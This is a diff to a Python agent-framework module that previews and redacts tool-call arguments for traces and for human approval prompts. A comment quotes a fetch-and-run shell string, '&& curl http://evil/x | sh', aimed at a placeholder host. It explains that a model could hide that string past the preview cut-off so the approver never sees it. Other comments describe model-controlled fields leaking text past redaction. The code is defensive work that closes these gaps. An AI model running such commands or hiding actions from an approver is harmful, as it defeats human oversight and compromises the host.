@@ -3,6 +3,7 @@ from __future__ import annotations
 from collections.abc import Callable, Mapping
 from typing import Any
 
+from monoid_agent_kernel.errors import WorkspaceError
 from monoid_agent_kernel.permissions import PermissionPolicy
 from monoid_agent_kernel.web import public_query_preview, public_url_preview
 
@@ -93,6 +94,19 @@ def public_proposal_file(file: dict[str, Any], policy: PermissionPolicy) -> dict
 
 
 def args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
+    """The generic trace preview: caps and content-field redaction, and **no secret-name guessing**.
+
+    Deliberately asymmetric with ``core.tool_approval.redact_tool_arguments``, which does mask
+    secret-*named* keys. That is not an oversight to bind: ``0109e06`` removed "unconfigurable
+    key-name/value guessing" from this module on purpose and made secret redaction beyond content
+    fields the integrating backend's job through the ``EventSink`` seam
+    (``examples/redacting_event_sink.py``, pinned by ``tests/test_observability.py``). The approval
+    record is a different artifact -- a human acts on it directly -- so it masks.
+
+    The consequence is real and worth stating rather than implying otherwise: an ``api_key`` argument
+    is masked on an ``ask``-gated call and published verbatim on an ``allow`` call. Anyone who wants
+    it masked on both adds the example sink, or does not pass credentials as tool arguments.
+    """
     return {key: preview_value(key, value, policy) for key, value in arguments.items()}
 
 
@@ -145,12 +159,23 @@ def shell_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> d
         "startup_wait_s": arguments.get("startup_wait_s"),
         "background": bool(arguments.get("background", False)),
         "resume_on_exit": bool(arguments.get("resume_on_exit", True)),
-        "env_keys": sorted(str(key) for key in env),
+        # Previewed, not copied. Env *keys* are model-controlled strings of unbounded length and
+        # count: a 20 KB key rode out verbatim here while the same value in a generic argument was
+        # capped. This branch withholds env *values* on purpose, so letting the keys carry arbitrary
+        # text made it a way to publish exactly what it was withholding.
+        "env_keys": preview_value("env_keys", sorted(str(key) for key in env), policy),
     }
 
 
 def web_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
-    del policy
+    """Preview for the web tools, which withhold the query and URL and publish only descriptors.
+
+    Every descriptor below is previewed rather than copied. They are model-controlled strings, and
+    copying them raw made this branch a way to publish the very text it exists to withhold: a
+    ``locale`` or a ``blocked_domains`` entry carrying 20 KB rode out verbatim in the same event
+    whose ``query_preview`` was reduced to a digest. Bypassing the cap is not free just because the
+    field sounds like an enum.
+    """
     preview: dict[str, Any] = {}
     if "query" in arguments:
         preview["query_preview"] = public_query_preview(str(arguments.get("query") or ""))
@@ -168,11 +193,15 @@ def web_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dic
         "format",
     ):
         if key in arguments:
-            preview[key] = arguments[key]
+            preview[key] = preview_value(key, arguments[key], policy)
     if "allowed_domains" in arguments:
-        preview["allowed_domains"] = arguments.get("allowed_domains") or []
+        preview["allowed_domains"] = preview_value(
+            "allowed_domains", arguments.get("allowed_domains") or [], policy
+        )
     if "blocked_domains" in arguments:
-        preview["blocked_domains"] = arguments.get("blocked_domains") or []
+        preview["blocked_domains"] = preview_value(
+            "blocked_domains", arguments.get("blocked_domains") or [], policy
+        )
     return preview
 
 
@@ -193,6 +222,24 @@ PREVIEW_BYTE_BUDGET = 160
 PREVIEW_MAX_DEPTH = 8
 PREVIEW_MAX_KEYS = 20
 PREVIEW_MAX_ITEMS = 20
+
+# The *decision* surface's budget. An approval preview is read by a person deciding whether to let a
+# call run, not by a log reader, and the two want opposite things from a cap. Measured on the trace
+# budget: a 341-byte `shell.exec` command was cut at 160 bytes, so `&& curl http://evil/x | sh`
+# reached no surface the approver could see -- with the model choosing where in the string to put it.
+# That is a strictly worse trade than the egress it buys, because a whole *file body* (the leak this
+# release exists to close) is redacted outright by `_is_content_field` regardless of this number.
+# So: big enough for any realistic command or argument, still bounded against a pathological one.
+APPROVAL_BYTE_THRESHOLD = 4096
+APPROVAL_BYTE_BUDGET = 4096
+
+# Keys whose value a renderer prints inline, so the preview has to stay a *string*. Replacing one
+# with a `{"preview": ...}` dict renders `[object Object]` -- `WorkspaceInspector.svelte` does
+# `{item.step}`, and `svelte-check` cannot catch it because `run-state.ts` casts through `unknown`.
+_INLINE_TEXT_KEYS = frozenset({"step"})
+
+# Truncation marker for those keys. A bare prefix would misreport a cut value as the whole value.
+TRUNCATION_SUFFIX = "…"
 
 
 def truncate_to_bytes(value: str, max_bytes: int) -> str:
@@ -232,6 +279,8 @@ def preview_value(
     policy: PermissionPolicy,
     *,
     mask: Callable[[str, Any], Any] | None = None,
+    threshold: int = PREVIEW_BYTE_THRESHOLD,
+    budget: int = PREVIEW_BYTE_BUDGET,
     _depth: int = 0,
 ) -> Any:
     """Bound a value for publication, optionally masking keys the caller names first.
@@ -250,14 +299,20 @@ def preview_value(
     lowered = key.lower()
     if _is_content_field(lowered):
         return redacted_value(value)
-    if lowered in {"path", "root", "cwd"} and isinstance(value, str) and policy.is_path_redacted(value):
+    if lowered in {"path", "root", "cwd"} and isinstance(value, str) and _is_path_redacted(value, policy):
         return redacted_value(value)
     if isinstance(value, (dict, list)) and _depth >= PREVIEW_MAX_DEPTH:
         return {"truncated": True, "type": type(value).__name__, "depth_exceeded": PREVIEW_MAX_DEPTH}
     if isinstance(value, dict):
         preview = {
             str(child_key): preview_value(
-                str(child_key), child_value, policy, mask=mask, _depth=_depth + 1
+                str(child_key),
+                child_value,
+                policy,
+                mask=mask,
+                threshold=threshold,
+                budget=budget,
+                _depth=_depth + 1,
             )
             for child_key, child_value in list(value.items())[:PREVIEW_MAX_KEYS]
         }
@@ -273,7 +328,9 @@ def preview_value(
         # secret-named list is already masked whole before reaching here; what this carries is the
         # mask *down* to dicts inside the list, so ``{"headers": [{"api_key": ...}]}`` still masks.
         items = [
-            preview_value(key, item, policy, mask=mask, _depth=_depth + 1)
+            preview_value(
+                key, item, policy, mask=mask, threshold=threshold, budget=budget, _depth=_depth + 1
+            )
             for item in value[:PREVIEW_MAX_ITEMS]
         ]
         if len(value) > PREVIEW_MAX_ITEMS:
@@ -281,15 +338,34 @@ def preview_value(
         return items
     if isinstance(value, str):
         encoded_len = len(value.encode("utf-8"))
-        if encoded_len > PREVIEW_BYTE_THRESHOLD:
+        if encoded_len > threshold:
+            if lowered in _INLINE_TEXT_KEYS:
+                # Stays a string: a renderer prints this one directly.
+                return truncate_to_bytes(value, budget) + TRUNCATION_SUFFIX
             return {
                 "type": "str",
-                "preview": truncate_to_bytes(value, PREVIEW_BYTE_BUDGET),
+                "preview": truncate_to_bytes(value, budget),
                 "bytes": encoded_len,
                 "truncated": True,
             }
         return value
     return value
+
+
+def _is_path_redacted(value: str, policy: PermissionPolicy) -> bool:
+    """``policy.is_path_redacted``, but a path that cannot be normalized counts as redacted.
+
+    ``is_path_redacted`` normalizes before matching, and normalization *raises* on an absolute path
+    or a ``..`` traversal — both of which a model can put in a ``path`` argument. Left to propagate,
+    that ends the run from inside event construction: the preview builders sit on the emit path, and
+    ``WorkspaceError`` escaping there kills a run for an operator whose only mistake was configuring
+    ``redact_patterns``. Fail closed rather than open: an argument that does not name a workspace
+    path is precisely the kind that should not be published verbatim.
+    """
+    try:
+        return policy.is_path_redacted(value)
+    except WorkspaceError:
+        return True
 
 
 def redacted_value(value: Any) -> dict[str, Any]:
